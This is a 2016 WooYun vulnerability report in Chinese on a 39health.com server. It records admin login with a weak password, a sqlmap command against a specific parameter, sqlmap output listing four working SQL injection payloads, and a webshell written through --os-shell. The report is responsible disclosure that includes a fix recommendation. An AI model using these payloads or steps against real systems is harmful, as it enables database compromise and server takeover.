wybug_title: 39健康网某处SQL注入导致某服务器getshell
wybug_detail:
漏洞详情 披露状态：   									2016-01-16：	细节已通知厂商并且等待厂商处理中									2016-01-18：	厂商已经确认，细节仅向厂商公开									2016-01-28：	细节向核心白帽子及相关领域专家公开									2016-02-07：	细节向普通白帽子公开									2016-02-17：	细节向实习白帽子公开									2016-02-27：	细节向公众公开  简要描述： getshell 详细说明：  http://106.3.36.125/dgws/弱口令账号admin  密码 123456进入后台

然后找到一处注入http://106.3.36.125/dgws/home/appointment/newapp?aid=426直接丢入SQLmap
sqlmap.py -u"http://106.3.36.125/dgws/home/appointment/newapp?aid=426" --cookie="PHPSESSID=43rfrqi3i9i311ohmrh1ecjrm2" --is-dba

sqlmap resumed the following injection point(s) from stored session:---Parameter: aid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: aid=426' AND 1870=1870 AND 'ahYx'='ahYx    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: aid=426' AND (SELECT 2724 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(2724=2724,1))),0x717a786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'GsVR'='GsVR    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: aid=426';(SELECT * FROM (SELECT(SLEEP(5)))JcBe)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: aid=426' AND (SELECT * FROM (SELECT(SLEEP(5)))kryP) AND 'nOEp'='nOEp---[10:04:53] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.4back-end DBMS: MySQL 5.0[10:04:53] [INFO] testing if current user is DBA[10:04:53] [INFO] fetching current user[10:04:53] [INFO] resumed: root@%current user is DBA:    True
看了一眼，是DBA用户，应该可以写shell 于是--os-shell，找了一下路径http://106.3.36.125/phpinfo.php正好看见有一个info泄露，开始写Shell

发现写不进去，于是用外部链接数据库编码写shell



成功拿到shellhttp://106.3.36.125/phpinfoxxxaas.phpxa21   漏洞证明：  

   修复方案：  修改弱口令密码过滤注入求20Rank   版权声明：转载请注明来源 90Snake@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-01-18 09:16 厂商回复： 测试环境 最新状态： 暂无
